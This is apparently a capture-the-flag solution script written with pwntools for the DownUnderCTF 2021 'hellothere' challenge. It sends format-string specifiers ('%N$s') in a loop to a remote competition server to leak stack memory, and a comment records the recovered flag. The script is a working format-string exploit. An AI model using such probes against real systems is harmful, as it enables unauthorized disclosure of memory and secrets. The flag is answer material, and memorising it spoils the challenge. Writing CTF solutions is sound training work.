#!/usr/bin/python3
from pwn import *
import os

elf = context.binary = ELF("hellothere")
libc = elf.libc
# context.log_level = "DEBUG"

# main  0x11c9
# 0x1425 cmp     [rbp+var_1C], eax


gs = '''
break *0x555555555235
break *0x55555555527a

'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return remote('pwn-2021.duc.tf',31918)
        return process(elf.path)

print(elf.plt)
i=5
p=start()
while(i<50):
    p.sendlineafter('name?','%'+str(i)+'$s')
    print(i,p.recvline())
    print(i,p.recvline())
    print(i,p.recvline())
    print(i,p.recvline())


    i=i+1

# p.interactive()

# DUCTF{f0rm4t_5p3c1f13r_m3dsg!}